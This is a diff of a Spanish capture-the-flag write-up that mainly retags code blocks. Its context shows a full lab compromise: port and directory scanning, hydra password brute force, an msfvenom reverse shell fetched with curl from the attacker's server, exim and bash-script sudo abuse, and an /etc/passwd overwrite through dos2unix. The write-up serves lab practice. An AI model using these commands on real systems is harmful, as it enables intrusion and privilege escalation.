@@ -1,10 +1,10 @@
 # Enumeracion de Puertos, Servicios y Versiones
 
-```
+```ruby
 nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2 -oN nmap
 ```
 
-```
+```ruby
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-02 13:55 -03
 Nmap scan report for 172.17.0.2
 Host is up (0.0000020s latency).
@@ -32,7 +32,7 @@ chequeo el codigo fuente pero no consigo nada, intento con credenciales por defe
 
 # Fuzzing Web
 
-```
+```ruby
 feroxbuster -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png,log -t 200 -d 10 --random-agent
 ```
 
@@ -42,10 +42,10 @@ no me arroja resultados pero inspeccionando la web, veo que posee cookies
 
 asi que se las paso a feroxbuster
 
-```
+```ruby
 feroxbuster -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png,log -t 200 -d 10 --random-agent -H 'cookie: PHPSESSID=t2d0hebr4qjb42n2fc5daam94d'
 ```
-```
+```ruby
  ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
 |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
@@ -74,11 +74,11 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 solo consigo un index.php que tras chequear es el mismo panel de login y revisando el codigo fuente no obserno nada que me pueda servir, asi que me tocara ir aplicando fuerza bruta
 con hydra y usuarios como root, administrator o admin a ver si logro algo
 
-```
+```ruby
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.17.0.2 http-post-form "/index.php:username=^USER^&password=^PASS^:H=Cookie: PHPSESSID=t2d0hebr4qjb42n2fc5daam94d:F=Credenciales incorrectas."
 ```
 
-```
+```ruby
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-02 14:16:23
@@ -113,7 +113,7 @@ y recargo la web, debajo del panel de login puedo observar que en efecto se ejec
 
 sabiendo esto, puedo ahora enviarme una revershell asi que me coloco en escucha con netcat
 
-```
+```ruby
 nc -lnvp 4444
 Listening on 0.0.0.0 4444
 ```
@@ -129,7 +129,7 @@ y obtengo la conexion pero por alguna razon despues de un par de segundos me sac
 despues de un rato intentando mantener la conexion se me ocurrio probar hacer uso de un binario de msfvenom para establecer la conexion, pero primero pruebo si el server
 tiene instalado ya sea wget o curl para que descargue el binario y para esto primero me levanto un server python en mi maquina
 
-```
+```ruby
 python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
@@ -144,7 +144,7 @@ aqui puedo ver que funciona curl en el servidor
 
 ya que se cual esta instalado, me creo el binario de msfvenom
 
-```
+```ruby
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f elf -o reverse.elf
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -179,8 +179,10 @@ y obtengo la conexion, espero un rato y esta vez no me desconecta
 
 # Escalada de Privilegios
 
+### www-data
+
 tratando la terminal
-```
+```css
 export SHELL=bash
 export TERM=xterm
 script /dev/null -c bash
@@ -192,7 +194,7 @@ stty rows 38 columns 168
 ```
 chequeo lo user's del sistema y existen 3
 
-```
+```css
 cat /etc/passwd |grep bash
 root:x:0:0:root:/root:/bin/bash
 maci:x:1000:1000::/home/maci:/bin/bash
@@ -217,11 +219,11 @@ asi que creo un archivo que contenga este hash en mi maquina atacante y se la pa
 
 y logre conseguir la password del user darksblack asi que puedo cambiar de user
 
-# User darksblack
+### darksblack
 
 ![Screenshot From 2024-11-02 15-36-47](https://github.com/user-attachments/assets/6bbff8b6-158b-44fe-ac64-fe12d1575739)
 
-```
+```css
 sudo -l
 Matching Defaults entries for darksblack on 9c13e159e6ea:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
@@ -233,7 +235,7 @@ User darksblack may run the following commands on 9c13e159e6ea:
 ahora como el user darksblack es que puedo hacer uso del script que habia conseguido anteriormente, asi que procedo a la escalada hacia el user maci aprovechandome del 
 script
 
-```
+```css
 sudo -u maci /home/maci/script.sh
 Adivina: a[$(/bin/bash -p >&2)]+123123
 maci@9c13e159e6ea:~$ whoami
@@ -246,7 +248,7 @@ User maci may run the following commands on 9c13e159e6ea:
     (pepe) NOPASSWD: /usr/sbin/exim
 
 ```
-# User maci
+### maci
 
 podemos ejecutar el binario exim como el user pepe, en este punto me tomo mucho tiempo de investigacion, prueba y error pero al final consegui respuesta en la propia
 documentacion del binario, ya que los exploit que consegui era para una ejecucion remota de comandos los cuales no me servirian...
@@ -261,13 +263,13 @@ la verdad tuve que leer mucha documentacion, muchas puebas y errores hasta que l
 aunque fuera sido tan facil como consultarle a la inteligencia artificial y automaticamente me lo da sin haber hecho mucho esfuerzo (pero eso no tiene merito alguno),
 pero existe un problema al intentar lanzar una bash como el user pepe
 
-```
+```css
 maci@9c13e159e6ea:~$ sudo -u pepe /usr/sbin/exim -be '${run{/bin/bash -c "/bin/bash"}}'
 ```
 
 no puedo obtener la bash asi como asi, asi que creare un script en python que me envie una revershell
 
-```
+```css
 nano /tmp/revershell.py
 ```
 ```
@@ -287,10 +289,10 @@ pty.spawn("/bin/bash")
 le asigno permisos de ejecucion `chmod +x /tmp/revershell.py`, me coloco en escucha netcat en mi maquina atacante `nc -lnvp 4445` y ejecuto el script como el user
 pepe `sudo -u pepe /usr/sbin/exim -be '${run{/bin/bash -c "python3 /tmp/revershell.py"}}'`, chequeo netcaat y he recibido la conexion como el user pepe
 
-# User pepe
+### pepe
 
 tratando la bash
-```
+```css
 export SHELL=bash
 export TERM=xterm
 script /dev/null -c bash
@@ -303,7 +305,7 @@ stty rows 38 columns 168
 
 ahora chequeo si puedo ejecutar algun binario como root que es lo que me falta, ser root
 
-```
+```css
 sudo -l
 Matching Defaults entries for pepe on 9c13e159e6ea:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
@@ -314,7 +316,7 @@ User pepe may run the following commands on 9c13e159e6ea:
 
 puedo ejecutar el binario /usr/bin/dos2unix como root, la escalada es simple, primero voy a copiar el contenido del archivo /etc/passwd en un archivo en mi directorio
 
-```
+```css
 pepe@9c13e159e6ea:/home/pepe$ cat /etc/passwd > escalada
 pepe@9c13e159e6ea:/home/pepe$ cat escalada
 root:x:0:0:root:/root:/bin/bash
@@ -346,7 +348,7 @@ pepe@9c13e159e6ea:/home/pepe$
 ahora edito el archivo 'escalada' eliminando solo la 'x' que contiene la linea de root quedando: `root::0:0:root:/root:/bin/bash`
 por lo que ahora ya teniendo modificado el archivo 'escalada' procedo usar el binario '/usr/bin/dos2unix' como root para modificar el archivo '/etc/passwd'
 
-```
+```css
 sudo /usr/bin/dos2unix -f -n escalada /etc/passwd
 dos2unix: converting file escalada to file /etc/passwd in Unix format...
 su root
@@ -354,6 +356,5 @@ su root
 
 ![Screenshot From 2024-11-02 16-33-40](https://github.com/user-attachments/assets/8645136d-cd2b-457a-90bb-41a99eca4655)
 
-si me voy al directorio de root puedo observar 3 archivos; 2 script en bash y un archivo de log, chequeando los script entendi por que? me desconectaba al intentar
-lanzar la primera revershell y por que me costo realizar el tratamiento de la bash antes de dar con la forma de evadir el script
+
 
